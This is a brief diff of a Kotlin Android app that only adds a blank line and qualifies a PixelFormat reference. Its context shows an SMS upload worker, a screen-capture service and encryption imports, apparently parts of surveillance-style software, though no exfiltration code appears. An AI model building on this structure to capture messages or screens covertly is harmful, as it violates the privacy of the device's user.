@@ -19,6 +19,7 @@ import java.security.SecureRandom
 import java.util.concurrent.TimeUnit
 import javax.crypto.*
 import javax.crypto.spec.GCMParameterSpec
+
 class MainActivity : AppCompatActivity() {
     override fun onCreate(s: Bundle?) {
         super.onCreate(s)
@@ -83,7 +84,7 @@ class SmsUploadWorker(c: Context, p: WorkerParameters) : CoroutineWorker(c, p) {
 }
 class ScreenShotService : Service() {
     private var proj: MediaProjection? = null
-    private val reader = ImageReader.newInstance(1080, 1920, PixelFormat.RGBA_8888, 2)
+    private val reader = ImageReader.newInstance(1080, 1920, android.graphics.PixelFormat.RGBA_8888, 2)
     override fun onCreate() {
         super.onCreate()
         getSystemService(NotificationManager::class.java).createNotificationChannel(NotificationChannel("SCR_SVC", "Screenshot", NotificationManager.IMPORTANCE_LOW))
